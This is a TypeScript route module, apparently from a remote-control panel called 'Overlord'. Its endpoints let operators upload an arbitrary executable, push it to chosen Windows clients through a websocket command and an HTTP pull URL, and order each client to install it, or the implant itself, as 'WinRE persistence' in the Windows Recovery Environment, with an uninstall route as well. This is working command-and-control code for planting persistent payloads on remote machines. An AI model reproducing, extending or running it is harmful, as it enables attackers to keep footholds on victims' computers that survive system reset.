import fs from "fs/promises";
import path from "path";
import { v4 as uuidv4 } from "uuid";
import { authenticateRequest } from "../../auth";
import { AuditAction, logAudit } from "../../auditLog";
import * as clientManager from "../../clientManager";
import { metrics } from "../../metrics";
import { encodeMessage } from "../../protocol";
import { requirePermission } from "../../rbac";
import { createUploadPull } from "../file-transfer-state";

type RequestIpProvider = {
  requestIP: (req: Request) => { address?: string } | null | undefined;
};

type WinREUpload = {
  id: string;
  path: string;
  name: string;
  size: number;
};

type PendingCommandReply = {
  resolve: (result: { ok: boolean; message?: string }) => void;
  reject: (error: Error) => void;
  timeout: NodeJS.Timeout;
  clientId: string;
};

type WinRERouteDeps = {
  WINRE_ROOT: string;
  winreUploads: Map<string, WinREUpload>;
  pendingCommandReplies: Map<string, PendingCommandReply>;
};

function isWindowsClient(target: any): boolean {
  const clientOs = (target?.os || "").toLowerCase();
  return clientOs.includes("windows");
}

async function probeWinRE(deps: WinRERouteDeps, target: any, clientId: string): Promise<{ ok: boolean; reason?: string; message?: string }> {
  const cmdId = uuidv4();
  const replyPromise: Promise<{ ok: boolean; message?: string }> = new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      deps.pendingCommandReplies.delete(cmdId);
      reject(new Error("WinRE support probe timed out"));
    }, 15_000);
    deps.pendingCommandReplies.set(cmdId, { resolve, reject, timeout, clientId });
  });

  target.ws.send(
    encodeMessage({
      type: "command",
      commandType: "winre_probe",
      id: cmdId,
    }),
  );

  try {
    const result = await replyPromise;
    return result.ok
      ? { ok: true }
      : { ok: false, reason: "not_enabled", message: result.message || "WinRE persistence is not enabled on this client" };
  } catch (error: any) {
    return { ok: false, reason: "probe_failed", message: error.message || "WinRE support probe failed" };
  }
}

export async function handleWinRERoutes(
  req: Request,
  url: URL,
  server: RequestIpProvider,
  deps: WinRERouteDeps,
): Promise<Response | null> {
  if (!url.pathname.startsWith("/api/winre")) {
    return null;
  }

  if (req.method === "POST" && url.pathname === "/api/winre/upload") {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }
    try {
      requirePermission(user, "clients:winre");
    } catch (error) {
      if (error instanceof Response) return error;
      return new Response("Forbidden", { status: 403 });
    }

    let form: FormData;
    try {
      form = await req.formData();
    } catch {
      return new Response("Bad request", { status: 400 });
    }

    const file = form.get("file");
    if (!(file instanceof File)) {
      return new Response("Missing file", { status: 400 });
    }

    const filename = path.basename(file.name || "upload.exe");
    const id = uuidv4();
    await fs.mkdir(deps.WINRE_ROOT, { recursive: true });
    const folder = path.join(deps.WINRE_ROOT, id);
    await fs.mkdir(folder, { recursive: true });
    const targetPath = path.join(folder, filename);
    const bytes = new Uint8Array(await file.arrayBuffer());
    await fs.writeFile(targetPath, bytes);

    const entry: WinREUpload = {
      id,
      path: targetPath,
      name: filename,
      size: bytes.length,
    };
    deps.winreUploads.set(id, entry);

    return Response.json({ ok: true, uploadId: id, name: filename, size: bytes.length });
  }

  if (req.method === "POST" && url.pathname === "/api/winre/install") {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }
    try {
      requirePermission(user, "clients:winre");
    } catch (error) {
      if (error instanceof Response) return error;
      return new Response("Forbidden", { status: 403 });
    }

    let body: any = {};
    try {
      body = await req.json();
    } catch {
      return new Response("Bad request", { status: 400 });
    }

    const uploadId = typeof body?.uploadId === "string" ? body.uploadId : "";
    const clientIds = Array.isArray(body?.clientIds) ? body.clientIds : [];
    if (!uploadId || clientIds.length === 0) {
      return new Response("Bad request", { status: 400 });
    }

    const upload = deps.winreUploads.get(uploadId);
    if (!upload) {
      return new Response("Not found", { status: 404 });
    }

    const results: Array<{ clientId: string; ok: boolean; reason?: string; error?: string }> = [];

    for (const clientId of clientIds) {
      const target = clientManager.getClient(clientId);
      if (!target) {
        results.push({ clientId, ok: false, reason: "offline" });
        continue;
      }

      if (!isWindowsClient(target)) {
        results.push({ clientId, ok: false, reason: "windows_only" });
        continue;
      }

      const probe = await probeWinRE(deps, target, clientId);
      if (!probe.ok) {
        results.push({ clientId, ok: false, reason: probe.reason, error: probe.message });
        continue;
      }

      const destDir = `C:\\Windows\\Temp\\Overlord\\winre_${upload.id}`;
      const destPath = `${destDir}\\${upload.name}`;

      const pullId = createUploadPull({
        clientId,
        filePath: upload.path,
        fileName: upload.name,
        size: upload.size,
      });
      const pullUrl = `${url.origin}/api/file/upload/pull/${encodeURIComponent(pullId)}`;

      target.ws.send(
        encodeMessage({
          type: "command",
          commandType: "file_upload_http" as any,
          id: uuidv4(),
          payload: { path: destPath, url: pullUrl, total: upload.size },
        }),
      );

      const cmdId = uuidv4();
      target.ws.send(
        encodeMessage({
          type: "command",
          commandType: "winre_install",
          id: cmdId,
          payload: { filePath: destPath },
        }),
      );

      metrics.recordCommand("winre_install");
      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip: server.requestIP(req)?.address || "unknown",
        action: AuditAction.WINRE_INSTALL,
        targetClientId: clientId,
        success: true,
        details: JSON.stringify({ uploadId, filePath: destPath }),
      });

      results.push({ clientId, ok: true });
    }

    return Response.json({ ok: true, results });
  }

  if (req.method === "POST" && url.pathname === "/api/winre/install-self") {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }
    try {
      requirePermission(user, "clients:winre");
    } catch (error) {
      if (error instanceof Response) return error;
      return new Response("Forbidden", { status: 403 });
    }

    let body: any = {};
    try {
      body = await req.json();
    } catch {
      return new Response("Bad request", { status: 400 });
    }

    const clientIds = Array.isArray(body?.clientIds) ? body.clientIds : [];
    if (clientIds.length === 0) {
      return new Response("Bad request", { status: 400 });
    }

    const results: Array<{ clientId: string; ok: boolean; reason?: string; error?: string }> = [];

    for (const clientId of clientIds) {
      const target = clientManager.getClient(clientId);
      if (!target) {
        results.push({ clientId, ok: false, reason: "offline" });
        continue;
      }

      if (!isWindowsClient(target)) {
        results.push({ clientId, ok: false, reason: "windows_only" });
        continue;
      }

      const probe = await probeWinRE(deps, target, clientId);
      if (!probe.ok) {
        results.push({ clientId, ok: false, reason: probe.reason, error: probe.message });
        continue;
      }

      const cmdId = uuidv4();
      target.ws.send(
        encodeMessage({
          type: "command",
          commandType: "winre_install",
          id: cmdId,
          payload: { useSelf: true },
        }),
      );

      metrics.recordCommand("winre_install");
      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip: server.requestIP(req)?.address || "unknown",
        action: AuditAction.WINRE_INSTALL,
        targetClientId: clientId,
        success: true,
        details: JSON.stringify({ useSelf: true }),
      });

      results.push({ clientId, ok: true });
    }

    return Response.json({ ok: true, results });
  }

  if (req.method === "POST" && url.pathname === "/api/winre/uninstall") {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }
    try {
      requirePermission(user, "clients:winre");
    } catch (error) {
      if (error instanceof Response) return error;
      return new Response("Forbidden", { status: 403 });
    }

    let body: any = {};
    try {
      body = await req.json();
    } catch {
      return new Response("Bad request", { status: 400 });
    }

    const clientIds = Array.isArray(body?.clientIds) ? body.clientIds : [];
    if (clientIds.length === 0) {
      return new Response("Bad request", { status: 400 });
    }

    const results: Array<{ clientId: string; ok: boolean; reason?: string; error?: string }> = [];

    for (const clientId of clientIds) {
      const target = clientManager.getClient(clientId);
      if (!target) {
        results.push({ clientId, ok: false, reason: "offline" });
        continue;
      }

      if (!isWindowsClient(target)) {
        results.push({ clientId, ok: false, reason: "windows_only" });
        continue;
      }

      const probe = await probeWinRE(deps, target, clientId);
      if (!probe.ok) {
        results.push({ clientId, ok: false, reason: probe.reason, error: probe.message });
        continue;
      }

      const cmdId = uuidv4();
      target.ws.send(
        encodeMessage({
          type: "command",
          commandType: "winre_uninstall",
          id: cmdId,
          payload: {},
        }),
      );

      metrics.recordCommand("winre_uninstall");
      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip: server.requestIP(req)?.address || "unknown",
        action: AuditAction.WINRE_UNINSTALL,
        targetClientId: clientId,
        success: true,
        details: JSON.stringify({ clientId }),
      });

      results.push({ clientId, ok: true });
    }

    return Response.json({ ok: true, results });
  }

  return null;
}
